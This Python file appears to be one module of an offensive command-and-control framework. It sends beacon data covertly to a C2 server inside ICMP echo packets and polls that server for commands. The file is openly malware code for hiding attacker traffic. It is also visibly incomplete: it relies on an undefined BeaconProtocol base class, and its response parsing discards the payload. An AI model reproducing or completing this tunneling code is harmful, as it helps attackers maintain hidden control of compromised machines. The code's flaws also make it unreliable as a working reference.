#!/usr/bin/env python3
"""
ICMP Protocol Handler - ICMP Tunneling for C2
Features: ICMP echo requests/responses for covert communication
"""

import socket
import struct
import time
import os
import hashlib
import base64
import threading
from typing import Optional, Dict, List
import json

class ICMPProtocol:
    """ICMP protocol handler for C2 communication"""
    
    # ICMP types
    ICMP_ECHO_REPLY = 0
    ICMP_ECHO_REQUEST = 8
    
    # ICMP header structure
    ICMP_HEADER = struct.Struct('!BBHHH')
    
    def __init__(self, source_port: int = 0, dest_port: int = 0, pattern: str = "PING"):
        self.source_port = source_port
        self.dest_port = dest_port
        self.pattern = pattern.encode()
        self.sequence = 0
        self.beacon_id = None
        self.pending_requests = {}
        self.response_queue = []
        
    def calculate_checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum"""
        if len(data) % 2 != 0:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            word = data[i] << 8 | data[i+1]
            checksum += word
        
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        return checksum
    
    def build_icmp_packet(self, icmp_type: int, icmp_code: int, data: bytes) -> bytes:
        """Build ICMP packet"""
        # ICMP header
        icmp_header = self.ICMP_HEADER.pack(icmp_type, icmp_code, 0, 0, self.sequence)
        
        # Payload
        payload = self.pattern + data
        
        # Calculate checksum
        packet = icmp_header + payload
        checksum = self.calculate_checksum(packet)
        
        # Rebuild with checksum
        icmp_header = self.ICMP_HEADER.pack(icmp_type, icmp_code, checksum, 0, self.sequence)
        return icmp_header + payload
    
    def parse_icmp_packet(self, data: bytes) -> Dict:
        """Parse ICMP packet"""
        try:
            # Parse ICMP header
            icmp_type, icmp_code, checksum, identifier, sequence = self.ICMP_HEADER.unpack(data[:8])
            
            # Extract payload
            payload = data[8:]
            
            # Remove pattern
            if payload.startswith(self.pattern):
                payload = payload[len(self.pattern):]
            
            return {
                'type': icmp_type,
                'code': icmp_code,
                'sequence': sequence,
                'payload': payload
            }
        except Exception as e:
            return {'error': str(e)}
    
    def send_icmp(self, dest_ip: str, data: bytes) -> Optional[Dict]:
        """Send ICMP packet and receive response"""
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(5)
            
            # Build ICMP packet
            packet = self.build_icmp_packet(self.ICMP_ECHO_REQUEST, 0, data)
            
            # Send packet
            sock.sendto(packet, (dest_ip, 0))
            
            # Receive response
            response, _ = sock.recvfrom(4096)
            sock.close()
            
            # Parse ICMP header (skip IP header)
            icmp_header = response[20:28]
            return self.parse_icmp_packet(icmp_header)
        except Exception as e:
            return None
    
    def encode_data_icmp(self, data: bytes, chunk_size: int = 1400) -> List[bytes]:
        """Encode data for ICMP chunks"""
        chunks = []
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            chunks.append(chunk)
        return chunks
    
    def beacon_icmp(self, beacon_data: Dict) -> bool:
        """Send beacon via ICMP"""
        try:
            # Encode beacon data
            json_data = json.dumps(beacon_data).encode()
            chunks = self.encode_data_icmp(json_data)
            
            # Send chunks
            for i, chunk in enumerate(chunks):
                self.sequence = i
                response = self.send_icmp(self.server, chunk)
                if not response:
                    return False
                time.sleep(0.1)
            
            return True
        except Exception as e:
            return False
    
    def check_for_commands_icmp(self) -> bool:
        """Check for commands via ICMP"""
        try:
            # Request commands
            self.sequence = 999
            cmd_request = b"GET_CMD"
            response = self.send_icmp(self.server, cmd_request)
            
            if response and 'payload' in response:
                try:
                    commands = json.loads(response['payload'])
                    self.response_queue.append(commands)
                    return True
                except:
                    pass
            return False
        except:
            return False


class ICMPBeaconProtocol(BeaconProtocol):
    """ICMP beacon protocol for C2 agent"""
    
    def __init__(self, server: str, port: int):
        super().__init__(server, port)
        self.icmp = ICMPProtocol()
        self.icmp.server = server
        
    def send_beacon(self, data: Dict) -> Optional[str]:
        """Send beacon via ICMP"""
        if self.icmp.beacon_icmp(data):
            return "beacon_sent"
        return None
    
    def receive_commands(self) -> Optional[List[Dict]]:
        """Receive commands via ICMP"""
        if self.icmp.response_queue:
            return self.icmp.response_queue.pop()
        return None
